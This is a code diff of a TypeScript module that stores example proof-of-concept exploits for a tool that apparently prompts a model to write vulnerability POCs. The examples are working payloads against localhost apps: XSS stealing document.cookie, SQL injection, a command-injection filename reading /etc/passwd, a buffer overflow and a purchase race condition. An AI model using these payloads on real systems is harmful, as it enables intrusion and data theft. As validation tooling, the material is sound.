@@ -1,60 +1,37 @@
-/**
- * Reference POC examples indexed by vulnerability category.
- * Used by buildPOCPrompt() to include up to 2 relevant examples per prompt call.
- */
-
-export interface PocOutput {
-  language: string;
-  code: string;
-  setupInstructions: string;
-  expectedImpact: string;
-  testSteps?: string[];
-  prerequisitesHandled?: {
-    exploitationDependencies: string;
-    reachability: string;
-    attackChain: string;
-  };
-  validated: boolean;
-}
-
 export interface PocExample {
   categories: string[];
-  example: PocOutput;
+  example: {
+    language: string;
+    code: string;
+    setupInstructions: string;
+    expectedImpact: string;
+    testSteps: string[];
+    prerequisitesHandled: {
+      exploitationDependencies: string;
+      reachability: string;
+      attackChain: string;
+    };
+    validated: false;
+  };
 }
 
-export const POC_EXAMPLES: readonly PocExample[] = Object.freeze([
+export const POC_EXAMPLES: PocExample[] = [
   {
     categories: ['xss', 'cross-site-scripting', 'dom', 'reflected', 'stored'],
     example: {
       language: 'html',
-      code: `<!DOCTYPE html>
-<html>
-<body>
-  <script>
-    // Exploitation dependency: user must be authenticated
-    fetch('http://localhost:3000/api/auth/check')
-      .then(r => r.json())
-      .then(auth => {
-        if (!auth.authenticated) { document.body.textContent = 'Must be logged in'; return; }
-        // Trigger reflected XSS at exact endpoint from vulnerability.location
-        fetch('http://localhost:3000/api/dashboard/search?query=<img src=x onerror=alert(document.cookie)>')
-          .then(r => r.text())
-          .then(html => { document.getElementById('result').innerHTML = html; });
-      });
-  </script>
-  <div id="result"></div>
-</body>
-</html>`,
-      setupInstructions: '1. Start target: npm start (port 3000)\n2. Create account and log in\n3. Open this HTML file in the same browser session',
-      expectedImpact: 'alert() executes showing document.cookie — confirms reflected XSS in authenticated context',
+      code: '<!DOCTYPE html>\n<html>\n<head><title>XSS Test Case</title></head>\n<body>\n  <p>Status: <span id="status">Checking...</span></p>\n  <script>\n    // Check authentication status (exploitation dependency: must be logged in)\n    fetch(\'http://localhost:3000/api/auth/check\')\n      .then(r => r.json())\n      .then(auth => {\n        if (!auth.authenticated) {\n          document.getElementById(\'status\').textContent = \'ERROR: Login required\';\n          return;\n        }\n        // Trigger the vulnerable endpoint with XSS payload\n        fetch(\'http://localhost:3000/api/dashboard/search?query=<img src=x onerror=alert(document.cookie)>\')\n          .then(r => r.text())\n          .then(html => { document.getElementById(\'result\').innerHTML = html; });\n      });\n  </script>\n  <div id="result"></div>\n</body>\n</html>',
+      setupInstructions: '1. Start target app: npm start (port 3000)\n2. Create account: curl -X POST http://localhost:3000/api/register -d \'{"user":"test","pass":"test123"}\'\n3. Login in browser at http://localhost:3000/login with test/test123\n4. Open this HTML file in the same browser session\n5. Observe alert popup with session cookie value',
+      expectedImpact: 'alert() executes showing document.cookie containing the session token, confirming reflected XSS in the authenticated dashboard search endpoint',
       testSteps: [
-        'Verify alert popup appears with cookie value',
-        'Check Network tab for the XSS payload in request URL',
+        'Verify alert() popup appears with cookie value',
+        'Check browser DevTools → Network tab to confirm XSS payload in request',
+        'Confirm response does not encode the <img> tag',
       ],
       prerequisitesHandled: {
-        exploitationDependencies: 'Checks authentication before triggering; setup includes account creation and login.',
-        reachability: '/api/dashboard/search requires authentication — handled by setup instructions.',
-        attackChain: 'query param → server reflects unsanitised → innerHTML executes injected script',
+        exploitationDependencies: 'Checks authentication status before triggering; setup instructions include account creation and login steps',
+        reachability: '/api/dashboard/search requires authentication; POC setup includes login step',
+        attackChain: 'User authenticated → visits search → query param reflected without encoding → innerHTML triggers script execution',
       },
       validated: false,
     },
@@ -63,84 +40,58 @@ export const POC_EXAMPLES: readonly PocExample[] = Object.freeze([
     categories: ['sql-injection', 'sqli', 'injection', 'database'],
     example: {
       language: 'javascript',
-      code: `const http = require('http');
-
-const payload = "1' OR '1'='1";
-const options = {
-  hostname: 'localhost', port: 3000,
-  path: '/api/users?id=' + encodeURIComponent(payload),
-  method: 'GET',
-};
-
-http.request(options, (res) => {
-  let data = '';
-  res.on('data', c => data += c);
-  res.on('end', () => console.log('Result:', data));
-}).end();`,
-      setupInstructions: '1. Ensure target app is running on localhost:3000\n2. Run: node poc.js',
-      expectedImpact: 'Returns all users from the database instead of a single row',
+      code: 'const http = require(\'http\');\n\nconst payload = "1\' OR \'1\'=\'1";\nconst options = {\n  hostname: \'localhost\',\n  port: 3000,\n  path: \'/api/users?id=\' + encodeURIComponent(payload),\n  method: \'GET\',\n};\n\nhttp.request(options, (res) => {\n  let data = \'\';\n  res.on(\'data\', chunk => data += chunk);\n  res.on(\'end\', () => {\n    const parsed = JSON.parse(data);\n    if (Array.isArray(parsed) && parsed.length > 1) {\n      console.log(\'TEST PASSED: returned\', parsed.length, \'rows (expected 1)\');\n    } else {\n      console.log(\'Test did not trigger — check endpoint and payload\');\n    }\n  });\n}).end();',
+      setupInstructions: '1. Ensure target app is running on localhost:3000\n2. Run: node poc.js\n3. Compare response row count to a normal request: node -e "require(\'http\').get(\'http://localhost:3000/api/users?id=1\', r => { let d=\'\'; r.on(\'data\',c=>d+=c); r.on(\'end\',()=>console.log(JSON.parse(d).length,\'rows\')); })"',
+      expectedImpact: 'Query returns all user rows instead of a single user, confirming SQL injection bypasses the WHERE clause',
       testSteps: [
-        'Verify response contains multiple user records',
-        'Confirm no error — query executed successfully',
+        'Run with normal id=1 — expect 1 row',
+        'Run with injection payload — expect >1 rows',
+        'Confirm response includes rows that should not be accessible to this request',
       ],
       prerequisitesHandled: {
-        exploitationDependencies: 'No special state required.',
-        reachability: 'Endpoint is publicly accessible.',
-        attackChain: 'query string → unsanitised SQL interpolation → full table returned',
+        exploitationDependencies: 'No special prerequisites; endpoint is accessible without authentication based on vulnerability analysis',
+        reachability: 'GET /api/users is publicly accessible',
+        attackChain: 'Attacker input → query param → string concatenation into SQL query → WHERE clause always true → full table returned',
       },
       validated: false,
     },
   },
   {
-    categories: ['command-injection', 'os-injection', 'rce'],
+    categories: ['command-injection', 'rce', 'exec', 'shell', 'os-injection'],
     example: {
       language: 'python',
-      code: `import requests
-
-payload = {'filename': 'test.txt; cat /etc/passwd'}
-response = requests.post('http://localhost:5000/upload', json=payload)
-print(response.text)  # Should contain /etc/passwd contents`,
-      setupInstructions: '1. pip install requests\n2. Ensure Flask app running on port 5000\n3. python3 poc.py',
-      expectedImpact: 'Response includes /etc/passwd contents — arbitrary command execution confirmed',
+      code: 'import requests\n\n# Inject shell metacharacter into filename parameter\npayload = {\'filename\': \'test.txt; cat /etc/passwd\'}\nresponse = requests.post(\'http://localhost:5000/upload\', json=payload)\nprint(\'Response:\', response.text)\n\nif \'root:x:0:0\' in response.text:\n    print(\'TEST PASSED: /etc/passwd contents returned\')\nelse:\n    print(\'Payload did not execute — check endpoint and parameter name\')  ',
+      setupInstructions: '1. pip install requests\n2. Ensure target app is running on port 5000\n3. python3 poc.py',
+      expectedImpact: '/etc/passwd contents appear in the response, confirming unsanitized shell execution of user-supplied filename',
       testSteps: [
-        'Verify "root:x:0:0" appears in response',
-        'Confirm status 200 (not an error response)',
+        'Run poc.py',
+        'Check response for "root:x:0:0" pattern',
+        'Confirm contents are from the server filesystem',
       ],
       prerequisitesHandled: {
-        exploitationDependencies: 'No special state required.',
-        reachability: '/upload is publicly accessible.',
-        attackChain: 'filename param → shell interpolation → cat /etc/passwd executes',
+        exploitationDependencies: 'No special state required; POST endpoint accepts unauthenticated requests per vulnerability analysis',
+        reachability: 'Endpoint /upload is reachable without authentication',
+        attackChain: 'filename parameter → unsanitized string passed to shell exec → shell interprets semicolon → second command executes',
       },
       validated: false,
     },
   },
   {
-    categories: ['buffer-overflow', 'memory-safety', 'heap-overflow', 'stack-overflow'],
+    categories: ['buffer-overflow', 'memory-corruption', 'heap-overflow', 'stack-overflow', 'memory-safety'],
     example: {
       language: 'c',
-      code: `#include <stdio.h>
-#include <string.h>
-
-int main() {
-    char buffer[1000];
-    memset(buffer, 'A', 999);
-    buffer[999] = '\\0';
-
-    // Call vulnerable function — overflows its internal 64-byte buffer
-    extern void parse_input(char*);
-    parse_input(buffer);
-    return 0;
-}`,
-      setupInstructions: '1. Compile: gcc -fsanitize=address -o poc poc.c vulnerable_app.o\n2. Run: ./poc\n3. Expect ASAN heap/stack-buffer-overflow report',
-      expectedImpact: 'Buffer overflow in parse_input() causes crash or ASAN-detected memory corruption',
+      code: '#include <stdio.h>\n#include <string.h>\n\nint main() {\n    // Create input larger than the target buffer\n    char input[1000];\n    memset(input, \'A\', 999);\n    input[999] = \'\\0\';\n\n    // Call the vulnerable function (replace with actual function name)\n    extern void parse_input(char*);\n    parse_input(input);\n\n    return 0;\n}',
+      setupInstructions: '1. Compile: gcc -o poc poc.c vulnerable_app.o (or link against the target library)\n2. Run under ASAN for clean output: gcc -fsanitize=address -o poc poc.c vulnerable_app.o && ./poc\n3. Without ASAN: ./poc — expect crash or abnormal exit code',
+      expectedImpact: 'parse_input() writes beyond its internal buffer boundary; ASAN reports heap/stack buffer overflow or program crashes with SIGSEGV',
       testSteps: [
-        'Run under AddressSanitizer and confirm heap/stack-buffer-overflow report',
-        'Check report points to the correct function and line number',
+        'Run with ASAN: expect "AddressSanitizer: heap/stack-buffer-overflow" in stderr',
+        'Without ASAN: confirm non-zero exit code or crash',
+        'Verify crash address corresponds to the vulnerable buffer in parse_input()',
       ],
       prerequisitesHandled: {
-        exploitationDependencies: 'Oversized 999-byte input triggers the overflow.',
-        reachability: 'parse_input() is called directly.',
-        attackChain: 'oversized input → strcpy/memcpy into fixed buffer → overflow',
+        exploitationDependencies: 'Input is crafted to exceed the internal buffer size identified in the vulnerability; no other state required',
+        reachability: 'parse_input() is called directly; no runtime conditions block it',
+        attackChain: 'Oversized input → parse_input() copies to fixed buffer without length check → overflow → memory corruption / crash',
       },
       validated: false,
     },
@@ -149,146 +100,37 @@ int main() {
     categories: ['race-condition', 'toctou', 'concurrency', 'threading'],
     example: {
       language: 'python',
-      code: `import requests, threading
-
-BASE_URL = 'http://localhost:5000'
-TOKEN = 'replace-with-actual-token'
-
-def purchase(item_id):
-    return requests.post(f'{BASE_URL}/api/purchase',
-                         json={'itemId': item_id, 'quantity': 1},
-                         headers={'Authorization': f'Bearer {TOKEN}'}).json()
-
-# Set balance to exactly the item price, then race 10 concurrent purchases
-requests.post(f'{BASE_URL}/api/test/set-balance', json={'balance': 100},
-              headers={'Authorization': f'Bearer {TOKEN}'})
-
-results = []
-threads = [threading.Thread(target=lambda: results.append(purchase(123))) for _ in range(10)]
-for t in threads: t.start()
-for t in threads: t.join()
-
-successes = [r for r in results if r.get('success')]
-balance = requests.get(f'{BASE_URL}/api/balance',
-                       headers={'Authorization': f'Bearer {TOKEN}'}).json()['balance']
-print(f'Successful purchases: {len(successes)} (expected 1)')
-print(f'Final balance: \${balance} (negative = race exploited)')`,
-      setupInstructions: '1. pip install requests\n2. Log in and replace TOKEN in poc.py\n3. python3 poc.py',
-      expectedImpact: 'Multiple purchases succeed with insufficient funds; final balance is negative',
+      code: 'import requests\nimport threading\n\nBASE_URL = \'http://localhost:5000\'\nTOKEN = \'<replace-with-session-token>\'\n\ndef purchase(item_id: int) -> dict:\n    return requests.post(\n        f\'{BASE_URL}/api/purchase\',\n        json={\'itemId\': item_id, \'quantity\': 1},\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    ).json()\n\ndef run_test():\n    # Set balance to exactly the item price\n    requests.post(\n        f\'{BASE_URL}/api/test/set-balance\',\n        json={\'balance\': 100},\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    )\n\n    results = []\n    threads = [threading.Thread(target=lambda: results.append(purchase(123))) for _ in range(10)]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n\n    successful = [r for r in results if r.get(\'success\')]\n    balance = requests.get(\n        f\'{BASE_URL}/api/balance\',\n        headers={\'Authorization\': f\'Bearer {TOKEN}\'},\n    ).json()[\'balance\']\n\n    print(f\'Successful purchases: {len(successful)} (expected ≤1)\')\n    print(f\'Final balance: ${balance} (negative = race condition confirmed)\')\n    return balance < 0\n\nif run_test():\n    print(\'TEST PASSED: race condition exploited\')\nelse:\n    print(\'Race not triggered — timing-dependent, retry or increase thread count\')',
+      setupInstructions: '1. pip install requests\n2. Start target app on port 5000\n3. Create account and obtain session token\n4. Replace <replace-with-session-token> in poc.py\n5. python3 poc.py (may need multiple runs — timing-dependent)',
+      expectedImpact: 'Multiple purchases complete with a balance that covers only one; final balance goes negative, demonstrating the TOCTOU window between balance-check and balance-deduct',
       testSteps: [
-        'Observe more than 1 "successful purchases"',
-        'Confirm final balance is negative',
+        'Run poc.py and observe "Successful purchases" count',
+        'Count > 1 confirms the race window was hit',
+        'Negative balance confirms funds were deducted multiple times',
       ],
       prerequisitesHandled: {
-        exploitationDependencies: '10 concurrent threads maximise probability of hitting the ~50 ms race window.',
-        reachability: '/api/purchase requires authentication — handled by TOKEN setup.',
-        attackChain: 'Thread A and B both pass balance check before either deducts → both deduct → balance negative',
+        exploitationDependencies: 'Race window requires concurrent requests; POC uses 10 threads to maximize hit probability; includes retry guidance for timing variance',
+        reachability: '/api/purchase requires authentication; setup instructions include token acquisition',
+        attackChain: 'Thread A checks balance (pass) → Thread B checks balance (pass, race!) → Thread A deducts → Thread B deducts → double-spend',
       },
       validated: false,
     },
   },
-  {
-    categories: ['prototype-pollution', 'sparse-array', 'type-confusion'],
-    example: {
-      language: 'javascript',
-      code: `const http = require('http');
-
-// Sparse array — holes bypass sanitisation at arrayUtils.js:67
-const sparse = [];
-sparse[0] = 'safe';
-sparse[100] = '<img src=x onerror=alert(1)>';  // hole from index 1-99
-
-const payload = JSON.stringify({ items: sparse, operation: 'transform' });
-const req = http.request(
-  { hostname: 'localhost', port: 3000, path: '/api/array/process',
-    method: 'POST', headers: { 'Content-Type': 'application/json' } },
-  res => {
-    let d = '';
-    res.on('data', c => d += c);
-    res.on('end', () => {
-      console.log(d.includes('<img src=x') ? '✓ XSS payload reflected' : '✗ not triggered');
-    });
-  }
-);
-req.write(payload); req.end();`,
-      setupInstructions: '1. Ensure target Node.js app running on port 3000\n2. node poc.js',
-      expectedImpact: 'Unsanitised XSS payload appears in response — sparse array bypassed sanitisation',
-      testSteps: [
-        'Response contains "<img src=x onerror=alert(1)>" literally',
-        'Retry with dense array ["safe", "<img...>"] — should be sanitised (control test)',
-      ],
-      prerequisitesHandled: {
-        exploitationDependencies: 'Array must be sparse; POC creates explicit hole at indices 1–99.',
-        reachability: '/api/array/process is publicly accessible.',
-        attackChain: 'sparse array → map() yields undefined holes → sanitise(undefined) bypasses filter → XSS reflected',
-      },
-      validated: false,
-    },
-  },
-  {
-    categories: ['feature-flag', 'unreachable-code', 'latent-vulnerability'],
-    example: {
-      language: 'bash',
-      code: `#!/bin/bash
-# Check reachability first
-if [ "$(curl -s http://localhost:8080/api/features | jq -r '.experimental')" = "false" ]; then
-  echo "UNREACHABLE: Enable ENABLE_EXPERIMENTAL in config/features.yaml then restart"
-  exit 1
-fi
-
-# Trigger command injection at experimental_handler.go:234
-RESPONSE=$(curl -s -X POST http://localhost:8080/api/experimental/process \\
-  -H 'Content-Type: application/x-www-form-urlencoded' \\
-  -d 'filename=test.txt; cat /etc/passwd')
-
-echo "$RESPONSE" | grep -q 'root:x:0:0' \\
-  && echo "✓ Command injection confirmed" \\
-  || echo "✗ Not triggered"`,
-      setupInstructions: '1. Start app: ./app start\n2. Enable feature: set ENABLE_EXPERIMENTAL: true in config/features.yaml\n3. Restart: ./app restart\n4. chmod +x poc.sh && ./poc.sh',
-      expectedImpact: 'Response contains /etc/passwd if feature is enabled; exits with UNREACHABLE message if disabled',
-      testSteps: [
-        'Run with feature DISABLED — expect UNREACHABLE message',
-        'Enable flag, restart, run again — expect "✓ Command injection confirmed"',
-      ],
-      prerequisitesHandled: {
-        exploitationDependencies: 'No complex dependencies once feature is enabled.',
-        reachability: 'Code unreachable by default — POC checks flag and provides instructions to enable it.',
-        attackChain: 'feature flag enabled → POST filename param → exec.Command() without sanitisation → shell executes cat /etc/passwd',
-      },
-      validated: false,
-    },
-  },
-]);
+];
 
 /**
- * Returns up to `maxCount` example POCs relevant to `vulnType`.
- *
- * Matching: `vulnType` is normalised (lower-case, spaces/underscores → hyphens) then
- * compared bidirectionally against each category string via substring inclusion —
- * `normalised.includes(c)` OR `c.includes(normalised)`. A short type like "sql" matches
- * the category "sql-injection" (c.includes(normalised)); a verbose type like
- * "cross-site-scripting" matches "xss" if the category is a substring of the normalised
- * type (normalised.includes(c)). When `vulnType` is itself a common substring (e.g.
- * "injection") it may match multiple category strings in the same or different entries;
- * results are capped by `maxCount`, so at most that many entries are returned.
- *
+ * Select up to maxCount examples whose categories overlap with the vulnerability type.
  * Returns an empty array when no category matches — irrelevant examples degrade model
- * output quality more than providing no examples at all. Logs a warning in that case
- * so degraded prompts are observable in production.
+ * output quality more than providing no examples at all.
  */
-export function selectPocExamples(vulnType: string, maxCount = 2): readonly PocOutput[] {
+export function selectPocExamples(vulnType: string, maxCount: number): PocExample[] {
   const normalised = vulnType.toLowerCase().replace(/[\s_]/g, '-');
-  const matched: PocOutput[] = [];
-
-  for (const entry of POC_EXAMPLES) {
-    if (matched.length >= maxCount) break;
-    if (entry.categories.some(c => normalised.includes(c) || c.includes(normalised))) {
-      matched.push(entry.example);
-    }
-  }
-
+  const matched = POC_EXAMPLES.filter(e =>
+    e.categories.some(c => normalised.includes(c) || c.includes(normalised))
+  );
   if (matched.length === 0) {
-    console.warn(`[poc-examples] No matching examples for vulnerability type "${vulnType}" — prompt will have no examples`);
+    console.warn(`[poc-examples] No examples matched vulnerability type "${vulnType}" — omitting examples from prompt`);
+    return [];
   }
-  return matched;
+  return matched.slice(0, maxCount);
 }
